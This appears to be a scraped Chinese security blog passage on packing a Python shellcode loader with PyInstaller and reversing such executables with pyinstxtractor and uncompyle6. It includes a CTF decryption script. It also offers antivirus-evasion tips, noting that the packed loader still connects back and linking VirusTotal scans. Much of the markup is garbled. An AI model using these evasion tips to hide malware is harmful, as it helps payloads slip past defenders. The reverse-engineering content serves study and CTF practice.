[![](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623919319667-4e4434ec-df38-4bf5-83cf-a03af9765ac4.png#height=116&id=FqsWm&originHeight=116&originWidth=986&originalType=binary&ratio=1&status=done&style=none&width=986)](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623919319667-4e4434ec-df38-4bf5-83cf-a03af9765ac4.png#height=116&id=FqsWm&originHeight=116&originWidth=986&originalType=binary&ratio=1&status=done&style=none&width=986)  
[![](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623919337576-1a6afcb0-6166-447c-a468-c4e370c262af.png#height=910&id=Mo1EK&originHeight=910&originWidth=3136&originalType=binary&ratio=1&status=done&style=none&width=3136)](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623919337576-1a6afcb0-6166-447c-a468-c4e370c262af.png#height=910&id=Mo1EK&originHeight=910&originWidth=3136&originalType=binary&ratio=1&status=done&style=none&width=3136)  
打开之后发现，文件和未使用`--key`参数的效果基本没什么变化。  
`--key`的参数针对的只是依赖库进行了加密而已。  
​

[![](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623919667313-d4ba111d-951b-42b1-a88e-5614ba279875.png#height=1244&id=jYDim&originHeight=1244&originWidth=1804&originalType=binary&ratio=1&status=done&style=none&width=1804)](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623919667313-d4ba111d-951b-42b1-a88e-5614ba279875.png#height=1244&id=jYDim&originHeight=1244&originWidth=1804&originalType=binary&ratio=1&status=done&style=none&width=1804)

总体上来讲，`python`打包的`exe`都是可以破解的，就算使用`cython`来写，依旧是可以破解的，只是时间问题而已，但是在这还是提出一些略微有效的方法（`自欺欺人`）。  
​

5.1 不使用 --key 参数
----------------

`将所有的代码进行封装为一个函数，在一个新的文件中引用`，其中`py_shellcode_fuzz.py`里的文件内容不变，只不过将其封装为一个函数，`test.py`来调用这个函数  
​

[`test.py`](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623921189135-b547334c-79dc-497b-b800-06f3c234c1f2.png#clientId=u17bc2246-e303-4&from=paste&height=306&id=uac9d6eba&margin=%5Bobject%20Object%5D&><img class=)

```
[# -*- encoding: utf-8 -*-
# Time : 2021/06/17 17:00:27
# Author: crow
import ctypes
from py_shellcode import shell 


if __name__ == '__main__':
    shell()](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623921189135-b547334c-79dc-497b-b800-06f3c234c1f2.png#clientId=u17bc2246-e303-4&from=paste&height=306&id=uac9d6eba&margin=%5Bobject%20Object%5D&><img class=) 
```

[直接运行`python py_shellcode_fuzz.py`  
](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623921189135-b547334c-79dc-497b-b800-06f3c234c1f2.png#clientId=u17bc2246-e303-4&from=paste&height=306&id=uac9d6eba&margin=%5Bobject%20Object%5D&><img class=)[![](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623921581858-894fa029-f302-41f7-a7e2-ad39a4f2625c.png#clientId=u17bc2246-e303-4&from=paste&height=710&id=ub8114790&margin=%5Bobject%20Object%5D&></a><br>
上线正常<br>
​</p><p></p><p>使用<code>test.py</code>调用该文件<br>
<code>python test.py</code> 上线正常<br>
​</p><p></p><p><a href=)![](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623921953646-b8605b3d-a1a9-43c9-8306-be918796d906.png#clientId=u17bc2246-e303-4&from=paste&height=796&id=ub22078a2&margin=%5Bobject%20Object%5D&></a></p><p></p><p>然后再对文件进行打包<br>
首先使用<code>pyinstaller</code>直接打包<br>
<code>pyinstaller -F --noconsole test.py</code></p><p></p><p><a href=)![](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623922067876-0c076c08-1991-4a1b-bfe8-38b57d1f0576.png#clientId=u17bc2246-e303-4&from=paste&height=774&id=ubfacab9e&margin=%5Bobject%20Object%5D&></a><br>
<a href=)![](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623922094406-49a71773-8941-46c4-8f0f-7a72ca2d8e65.png#clientId=u17bc2246-e303-4&from=paste&height=172&id=ufcb12400&margin=%5Bobject%20Object%5D&></a><br>
直接在<code>dist</code>文件夹下尝试获取<code>pyc</code>文件<br>
​</p><p></p><p><code>python pyinstxtractor.py test.exe</code><br>
​</p><p></p><p><a href=)![](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623922137754-6ee68a00-3aaa-4227-8281-aedc43bae553.png#clientId=u17bc2246-e303-4&from=paste&height=590&id=u5ea56a43&margin=%5Bobject%20Object%5D&></a></p><p></p><p><a href=)![](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623922160929-d34a7df4-b42e-4790-9497-d793cf4e8f62.png#clientId=u17bc2246-e303-4&from=paste&height=1402&id=u19eff94d&margin=%5Bobject%20Object%5D&></a><br>
将这两个文件单独拿出来，重复同样的操作</p><p></p><p><a href=)![](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623922260225-79185255-c5ef-452d-a904-1163e0de13f4.png#clientId=u17bc2246-e303-4&from=paste&height=856&id=u3a8e30b3&margin=%5Bobject%20Object%5D&></a></p><p></p><p><a href=)![](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623922290758-0ccd701d-e284-4560-8343-84a64c1cb579.png#clientId=u17bc2246-e303-4&from=paste&height=304&id=ue1804268&margin=%5Bobject%20Object%5D&></a></p><p></p><p><code>uncompyle6 get.pyc</code><br>
<a href=)![](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623922914601-6b8ec669-205f-4949-8928-f162fbc15dc2.png#clientId=u17bc2246-e303-4&from=paste&height=434&id=u9410fc96&margin=%5Bobject%20Object%5D&></a>将文件保存起来<br>
<a href=)![](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623922931466-f212bc1a-bc99-4bdd-b326-072294ee47fd.png#clientId=u17bc2246-e303-4&from=paste&height=80&id=u5ee36310&margin=%5Bobject%20Object%5D&></a><br>
<a href=)![](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623922946761-e46bd117-8db0-4702-ae17-1caa71fc72da.png#clientId=u17bc2246-e303-4&from=paste&height=640&id=u2e8659e1&margin=%5Bobject%20Object%5D&></a><br>
这里就无法找到<code>py_shell_fuzz</code>中的内容了，那文件到底在哪呢？<br>
我们将反编译之后的<code>PYZ-00.pyz_extracted</code>文件夹找到了该<code>pyc</code>文件<br>
​</p><p></p><p><a href=)![](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623923025995-4318a903-3aca-42e4-85b2-127758e8fee8.png#clientId=u17bc2246-e303-4&from=paste&height=1454&id=u7d6fe257&margin=%5Bobject%20Object%5D&></a></p><p></p><p><a href=)![](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623923065119-bd20969e-fe02-4eb1-a38c-4f1f7c8e57a0.png#clientId=u17bc2246-e303-4&from=paste&height=1482&id=uad80d064&margin=%5Bobject%20Object%5D&></a></p><p></p><p>对该 pyc 文件直接进行解密：<code>uncompyle6  py_shellcode_fuzz.pyc</code><br>
<a href=)![](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623923713628-ec8c2266-0477-4220-9355-d883199f638d.png#clientId=u17bc2246-e303-4&from=paste&height=764&id=ua74dfcb4&margin=%5Bobject%20Object%5D&></a><br>
​</p><p></p><p>报错，这里使用<code>010 editor</code>分析下<code>pyc</code>文件<br>
​</p><p></p><p>通过与<code>get.pyc</code>对比发现，这里少了<code>4</code>个字节，因此需要对其进行补全<br>
​</p><p></p><p><a href=)![](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623923989200-b5208be5-a553-4ced-881c-4b5e9ccb0366.png#clientId=u17bc2246-e303-4&from=paste&height=1264&id=udacfaff1&margin=%5Bobject%20Object%5D&></a><br>
​</p><p></p><p>将文件保存为<code>new_py_shell.pyc</code><br>
<a href=)![](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623924070228-a76a23a0-23f5-4689-b5d3-e9ce0c0d030e.png#clientId=u17bc2246-e303-4&from=paste&height=938&id=ua4fc3b47&margin=%5Bobject%20Object%5D&></a><br>
再对其进行解密<br>
<code>uncompyle6  new_py_shell.pyc</code><br>
<a href=)![](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623924125246-537916ea-d6f3-4ec7-9990-9c3484839195.png#clientId=u17bc2246-e303-4&from=paste&height=898&id=u375046a7&margin=%5Bobject%20Object%5D&></a><br>
再将文件保存起来<br>
<code>uncompyle6  new_py_shell.pyc > new_shell.py</code><br>
<a href=)![](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623924151763-fa1ffba1-5afb-4fd3-aed3-816433d418e7.png#clientId=u17bc2246-e303-4&from=paste&height=132&id=ub699ed1b&margin=%5Bobject%20Object%5D&></a><br>
此时该文件被完全解密<br>
<a href=)![](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623924187385-028e1ea1-0ce1-42f0-b9fd-976492fc5187.png#clientId=u17bc2246-e303-4&from=paste&height=1196&id=u0b4224c6&margin=%5Bobject%20Object%5D&></a><br>
​</p><p></p><p><a href=)![](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623941995356-62f2d310-454e-4bac-9392-c27d630cb63f.png#clientId=u17bc2246-e303-4&from=paste&height=994&id=uf4930d0e&margin=%5Bobject%20Object%5D&></a></p><p></p><p>此时将文件使用<code>VT</code>查杀测试<br>
<code>VT</code> 查杀<br>
<a href=)https://www.virustotal.com/gui/file-analysis/MWM3N2M3NmExNjhlZmZkMDNmZDZkMTY2MzU1YWZjMzI6MTYyMzk0MTQwMQ==/detection](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623921574657-bf179304-d1a6-47ce-ab7c-882249710e61.png#clientId=u17bc2246-e303-4&from=paste&height=116&id=ua0a91e1e&margin=%5Bobject%20Object%5D&><img class=)  
​

[5.2 pyinstaller 使用 --key 参数打包 exe](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623941452063-d4617c23-440c-423b-984b-d3d80c5224e8.png#clientId=u17bc2246-e303-4&from=paste&height=1862&id=BMg64&margin=%5Bobject%20Object%5D&><img class=)

[在上文中`pyinstaller`中`--key`参数可以对依赖库进行了加密，因此在这里尝试使用`--key`参数重新打包一下  
​](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623941452063-d4617c23-440c-423b-984b-d3d80c5224e8.png#clientId=u17bc2246-e303-4&from=paste&height=1862&id=BMg64&margin=%5Bobject%20Object%5D&><img class=)

[`pyinstaller -F --key crowcrow --noconsole test.py`  
​](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623941452063-d4617c23-440c-423b-984b-d3d80c5224e8.png#clientId=u17bc2246-e303-4&from=paste&height=1862&id=BMg64&margin=%5Bobject%20Object%5D&><img class=)

[![](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623939856136-3295c1a6-1f86-450f-af84-2780d31b1b3b.png#clientId=u17bc2246-e303-4&from=paste&height=1010&id=u5e07a82a&margin=%5Bobject%20Object%5D&></a><br>
<a href=)![](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623939870377-a4722fd3-f123-4849-b4e7-6a6cbf062934.png#clientId=u17bc2246-e303-4&from=paste&height=572&id=ufd84da73&margin=%5Bobject%20Object%5D&></a></p><p></p><p>这里该失败的失败，该成功的成功！<br>
​</p><p></p><p><a href=)![](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623939938092-ad8e8b42-ca60-44cb-9da1-af8e480de0b0.png#clientId=u17bc2246-e303-4&from=paste&height=290&id=u15f90231&margin=%5Bobject%20Object%5D&></a></p><p></p><p>同样的手法，对下面箭头的文件进行解密<br>
<a href=)![](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623939993677-d0789bcd-c267-4742-b95c-c099ee18e2bb.png#clientId=u17bc2246-e303-4&from=paste&height=1544&id=u08022183&margin=%5Bobject%20Object%5D&></a><br>
得到文件<code>final.pyc</code><br>
<a href=)![](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623940153856-fc2203d0-7667-4aeb-b53a-93c593d76bb3.png#clientId=u17bc2246-e303-4&from=paste&height=754&id=u7aac71d0&margin=%5Bobject%20Object%5D&></a><br>
​</p><p></p><p><code>uncompyle6 final.pyc</code></p><p></p><p><a href=)![](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623940247616-5790e956-5f86-48bc-bf42-a5d012749a95.png#clientId=u17bc2246-e303-4&from=paste&height=448&id=u166e2929&margin=%5Bobject%20Object%5D&></a><br>
这里和上面的也是一样的，显示从<code>py_shellcode_fuzz</code>中调用了<code>shell</code>函数。那就去同样的位置去找<code>py_shellcode_fuzz.pyc</code>文件。<br>
​</p><p></p><p>但是这里可以看到<code>py_shellcode_fuzz.pyc</code>已经被加密变成了<code>py_shellcode_fuzz.pyc.encrypted</code>文件格式。<br>
<a href=)![](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623940379233-2b149495-e048-4550-86e9-861cbc4e8852.png#clientId=u17bc2246-e303-4&from=paste&height=1602&id=uae710faf&margin=%5Bobject%20Object%5D&></a><br>
​</p><p></p><p>将该文件使用<code>010 editor</code>打开，通过对比发现，该文件已经被加密，无法使用<code>uncompyle6</code>对其进行解密，当然这个文件依旧可以解密，但是解密成本要高于目前的手法。<br>
<a href=)![](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623940624560-125fe4cf-86a2-4d90-940f-7d394dbdda42.png#clientId=u17bc2246-e303-4&from=paste&height=1188&id=u8dd783e9&margin=%5Bobject%20Object%5D&></a><br>
​</p><p></p><p>此时对原来的文件双击测试<br>
<a href=)![](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623941238721-3e6151bc-27f9-4a02-a671-4a14925d1220.png#clientId=u17bc2246-e303-4&from=paste&height=748&id=uf560e9b1&margin=%5Bobject%20Object%5D&></a><br>
依旧可以上线（<code>测试时间：2021.06.17</code>）<br>
​</p><p></p><p><a href=)![](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623942041491-633bf997-1b8e-408a-981c-b8381a9e3a13.png#clientId=u17bc2246-e303-4&from=paste&height=1000&id=u302778d3&margin=%5Bobject%20Object%5D&></a><br>
​</p><p></p><p><a href=)![](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623980328157-ca3e96d7-baed-4cc2-8ec7-a56ab695bdba.png#clientId=u3c33a6b8-c7dc-4&from=paste&height=1304&id=u0c7858d3&margin=%5Bobject%20Object%5D&></a><br>
​</p><p></p><p><code>VT</code>查杀：（<code>测试时间：2021.06.17</code>）<br>
​</p><p></p><p><a href=)https://www.virustotal.com/gui/file/c2b081a565dbd4848eff43a9bae0da4da5cd8945f12b053470484cdb2df838fc/detection](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623924454788-a277ca8e-d77c-4a55-ad20-f7054dce8af5.png#clientId=u17bc2246-e303-4&from=paste&height=992&id=u0bda2474&margin=%5Bobject%20Object%5D&><img class=)  
[![](https://cdn.nlark.com/yuque/0/2021/png/8378754/1635493088772-8feb0442-b53d-4821-b840-afe12f6bd632.png#clientId=u2a9cd9dd-799d-4&from=paste&height=1670&id=u08346b9b&margin=%5Bobject%20Object%5D&></a></p><p></p><h2 id=)5.3 总结](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623941280071-eaea199c-2dd5-4871-99a3-f090b633a229.png#clientId=u17bc2246-e303-4&from=paste&height=1588&id=u4a2a8fe0&margin=%5Bobject%20Object%5D&><img class=)

[从以上文章可以看出，将`shellcode`加载器写到一个文件中去，再使用另外一个脚本调用，在一定程度上可以免杀（`随着时间推移，该方法逐渐失效`），但是`--key`参数加密后的`py_shellcode_fuzz.pyc.encrypted`文件是无法解开的吗？  
理论上讲，该文件可以理解为勒索病毒加密之后的文件，如果`key`足够复杂，在还原文件上还是非常有难度的，但是在`pyinstaller`的作者并非将该文件写死，该文件还是能够进行还原的。  
​](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623941280071-eaea199c-2dd5-4871-99a3-f090b633a229.png#clientId=u17bc2246-e303-4&from=paste&height=1588&id=u4a2a8fe0&margin=%5Bobject%20Object%5D&><img class=)

[在这里，以本人有幸在某比赛上出过两个简单的`python`逆向题目，其中一个就是需要选手对`python`打包的`exe`进行逆向，具体的过程如下：](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623941280071-eaea199c-2dd5-4871-99a3-f090b633a229.png#clientId=u17bc2246-e303-4&from=paste&height=1588&id=u4a2a8fe0&margin=%5Bobject%20Object%5D&><img class=)

[6.1 背景介绍](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623941280071-eaea199c-2dd5-4871-99a3-f090b633a229.png#clientId=u17bc2246-e303-4&from=paste&height=1588&id=u4a2a8fe0&margin=%5Bobject%20Object%5D&><img class=)
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

[在这里使用了一个用`pyinstaller --key -F`参数打包的文件。  
](https://cdn.nlark.com/yuque/0/2021/png/8378754/1623941280071-eaea199c-2dd5-4871-99a3-f090b633a229.png#clientId=u17bc2246-e303-4&from=paste&height=1588&id=u4a2a8fe0&margin=%5Bobject%20Object%5D&><img class=)[![](https://cdn.nlark.com/yuque/0/2021/png/8378754/1634095986129-821cc23c-3830-44d3-8319-43076c378be5.png#from=url&id=dIolT&margin=%5Bobject%20Object%5D&originHeight=314&originWidth=522&originalType=binary&ratio=1&status=done&style=none)](https://cdn.nlark.com/yuque/0/2021/png/8378754/1634095986129-821cc23c-3830-44d3-8319-43076c378be5.png#from=url&id=dIolT&margin=%5Bobject%20Object%5D&originHeight=314&originWidth=522&originalType=binary&ratio=1&status=done&style=none)

6.2 第一层解包拿 key
--------------

使用`pyinstxtractor.py`进行逆向代码。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211105223759-f8d51b9a-3e45-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211105223759-f8d51b9a-3e45-1.png)  
在这里可以看到好多的代码是被混淆了，无法直接解密。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211105223810-ffe7ab1e-3e45-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211105223810-ffe7ab1e-3e45-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211105223829-0b0f4132-3e46-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211105223829-0b0f4132-3e46-1.png)

在这个文件夹下可以看到带`key`的文件，使用`notepad`打开。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211105223849-16c3aa22-3e46-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211105223849-16c3aa22-3e46-1.png)

在这里的`key`是`17`位 `000000guess_flag` 其中`N`并不属于`key`值。  
在这里使用脚本对加密的文件进行解密，如果是没使用`key`参数来搞的话，这个文件是未加密的。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211105223904-202209e2-3e46-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211105223904-202209e2-3e46-1.png)  
使用脚本来解密。

```
#from key import key
import tinyaes
key = "000000guess_flag"
print (key)

f = open('./guess.pyc.encrypted', 'rb')

data = f.read()

cipher = tinyaes.AES(key.encode(), data[:16])
output = cipher.CTR_xcrypt_buffer(data[16:])

f.close()
import zlib
output = zlib.decompress(output)

f = open('./guess.pyc', 'wb')
f.write(output)

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211105224007-453ed12e-3e46-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211105224007-453ed12e-3e46-1.png)  
然后复制该文件和 struct 文件进行处理

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211105224018-4c338592-3e46-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211105224018-4c338592-3e46-1.png)

复制`struct`文件的第一行，然后在复制`guess_pyc`文件的所有信息，到一个新建的文件中。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211105224032-5461f6cc-3e46-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211105224032-5461f6cc-3e46-1.png)

6.3 uncompyle6 逆向 pyc 文件
------------------------

`uncompyle6 reverse.pyc > code1013.py` 此时获得源代码。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211105224053-60b5ad92-3e46-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211105224053-60b5ad92-3e46-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211105224057-6383a15a-3e46-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211105224057-6383a15a-3e46-1.png)

7. 总结
-----

本文主要对`pyinstaller`打包的文件进行了超简单逆向分析，在这里也有一些免杀的小小的`tips`，其中也参考了诸多的资料，不乏有诸多错误，希望各位师傅能够批评指正。

8. 参考资料
-------

```
https://zhuanlan.zhihu.com/p/133303836
https://blog.csdn.net/lzy98/article/details/83246281
https://blog.csdn.net/qwemicheal/article/details/52864656
https://s0uthwood.github.io/2021/06/22/CISCN-N-2021-RE-Writeup/

```